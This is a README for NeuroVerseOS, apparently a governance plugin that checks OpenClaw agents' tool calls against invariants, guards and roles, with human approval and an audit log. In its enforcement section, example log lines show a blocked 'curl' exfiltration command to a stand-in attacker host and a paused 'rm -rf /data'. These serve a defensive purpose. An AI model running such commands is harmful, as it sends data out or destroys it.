# NeuroVerseOS — Governance Kernel for OpenClaw

NeuroVerseOS is a deterministic governance kernel for autonomous agents running in OpenClaw.

It compiles your `.md` agent files into a structured World File and enforces invariants, guards, rules, and role-based authority on every tool call.

No AI calls during enforcement. No network requests. Same world + same event = same verdict.

## What NeuroVerseOS Does

NeuroVerseOS introduces structured, enforceable governance to agent systems.

It ensures that:

- Global constraints cannot be silently weakened
- Role-based authority is enforced at runtime
- World updates require explicit human approval
- Governance integrity is verified on every tool call
- All decisions are auditable

This is not prompt filtering. This is runtime constitutional enforcement.

## Governance Model

NeuroVerseOS enforces governance across four layers:

1. **Invariants** — Unbreakable global constraints
2. **Guards** — Conditional limits requiring review
3. **Rules** — Context-aware evaluation logic
4. **Roles** — Delegated authority bound to agent identities

Role permissions are enforced inside world-level invariants. Delegated authority can never override global constraints.

## Governance Lifecycle

World updates follow a mandatory approval flow:

```
ACTIVE → PENDING → APPROVED → ACTIVE
```

- `/world bootstrap` creates a pending world
- `/world diff` shows structured changes
- `/world approve` activates it
- Critical changes require explicit confirmation

No world change activates silently.

## Installation

```bash
openclaw plugins install @neuroverseos/governance
```

For local development:

```bash
openclaw plugins install -l .
```

If OpenClaw runs on a VPS, install the plugin on that server.

## Storage Model

NeuroVerseOS stores governance state per OpenClaw workspace in:

```
.neuroverseos/
```

This directory contains:

- `world.json`
- `world.meta.json`
- `audit.jsonl`
- `state.json`
- `proposals/`

No global hidden state. Each workspace maintains independent governance.

## Quick Start

Inside your OpenClaw workspace:

```
/world bootstrap
/world diff
/world approve
```

This compiles your `.md` agent files into a structured World File and activates governance.

## Runtime Enforcement

Every tool call passes through a deterministic evaluation pipeline:

1. **Invariants** (BLOCK)
2. **Guards** (PAUSE or BLOCK)
3. **Rules** (context-aware verdict)
4. **Role constraints**
5. **Default** (ALLOW)

**Example BLOCK:**

```
[governance] BLOCK  shell → curl https://evil.com/exfil
             invariant: no-data-exfiltration
```

**Example PAUSE:**

```
[governance] PAUSE  shell → rm -rf /data
             guard: destructive_shell_requires_approval
             Allow? [y]es / [a]lways / [n]o
```

All verdicts are logged to `.neuroverseos/audit.jsonl`.

## Runtime Integrity Verification

Before evaluating rules, NeuroVerseOS verifies system integrity:

| Check | Behavior |
|-------|----------|
| World hash verification | BLOCK if modified outside approval pipeline |
| World missing detection | BLOCK if world deleted |
| Pending world reminder | Warn once per session |
| Source drift detection | Warn if `.md` files changed since bootstrap |

Critical failures fail closed.

**Example tamper detection:**

```
[!!!] World file integrity check failed.
→ Run /world restore
```

## Agent Identity → Role Binding

Each OpenClaw agent (`ctx.agentId`) is explicitly bound to a governance role.

Roles define:

- `canDo`
- `cannotDo`
- `requiresApproval`

Bindings are stored in `world.meta.json` and follow the same approval lifecycle as world changes.

Role enforcement is deterministic and runtime-verified.

## Drift Detection

NeuroVerseOS tracks divergence between your `.md` source files and the active World File.

If drift is detected:

- `/world status` shows changed files
- You are prompted to regenerate
- Governance never updates silently

## Composable Governance

Worlds are composable.

You can import or compose governance modules (e.g., operational safety, budget controls, strategy models) into a single enforceable World File.

All compositions generate a pending world and require approval.

## Commands

| Command | Description |
|---------|-------------|
| `/world bootstrap` | Compile `.md` files into pending world |
| `/world status` | View governance + integrity state |
| `/world diff` | Compare pending vs active |
| `/world approve` | Activate pending world |
| `/world reject` | Discard pending changes |
| `/world history` | View past versions |
| `/world rollback <N>` | Restore previous version |
| `/world restore` | Recover from tampering |
| `/world bind <agent> <role>` | Bind agent to role |
| `/world bindings` | View agent-role bindings |

## Design Principles

- Deterministic runtime enforcement
- Fail-closed integrity model
- Explicit human approval for world changes
- Role-based delegated authority
- Per-workspace deterministic storage
- No network calls during enforcement

## License

Apache 2.0
